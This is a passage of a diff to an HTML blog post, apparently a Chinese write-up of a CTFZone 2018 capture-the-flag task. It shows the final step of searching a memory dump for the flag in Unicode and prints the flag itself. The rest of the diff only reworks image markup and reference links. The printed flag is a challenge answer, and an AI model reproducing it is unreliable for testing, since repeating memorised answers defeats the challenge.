 <li>在二进制编辑器中，搜索 <code>ctfzone{</code> 字段，记得使用 Unicode 编码</li>
 <li>即可搜得 flag: <code>ctfzone{R3Flec7i0n}</code></li>
 </ol>
-
 <p>挺有意思的一道题目（笑</p>
-
-<p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/Validator3000.png" alt="Dump Memory" class="lazyload"><figcaption class="image-caption">Dump Memory</figcaption></figure>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/posts/CTFZone-2018/unicode.png" alt="Unicode" class="lazyload"><figcaption class="image-caption">Unicode</figcaption></figure></p>
-
+<p><img src="/images/posts/CTFZone-2018/Validator3000.png" alt="Dump Memory">
+<img src="/images/posts/CTFZone-2018/unicode.png" alt="Unicode"></p>
 <h2 id="参考链接">参考链接</h2>
-
 <ul>
-<li><a href="https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals" rel="nofollow noreferrer" target="_blank">p4 - 2018-07-21-ctfzone-quals</a></li>
-<li><a href="https://ctftime.org/event/632/tasks/" rel="nofollow noreferrer" target="_blank">writeup on ctftime</a></li>
+<li><a href="https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals">p4 - 2018-07-21-ctfzone-quals</a></li>
+<li><a href="https://ctftime.org/event/632/tasks/">writeup on ctftime</a></li>
 </ul>
 
     </div>
